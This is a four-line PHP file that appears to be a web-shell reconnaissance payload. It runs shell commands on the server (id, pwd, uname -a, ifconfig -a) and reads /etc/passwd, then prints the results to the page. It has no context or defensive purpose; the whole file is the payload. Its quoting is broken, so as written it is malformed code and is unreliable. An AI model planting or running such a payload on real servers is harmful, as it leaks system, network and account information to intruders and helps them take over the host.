<?php 
 $output = shell_exec('id;pwd;uname -a;ifconfig -a';cat /etc/passwd;);
 echo "<pre>$output</pre>";
?>
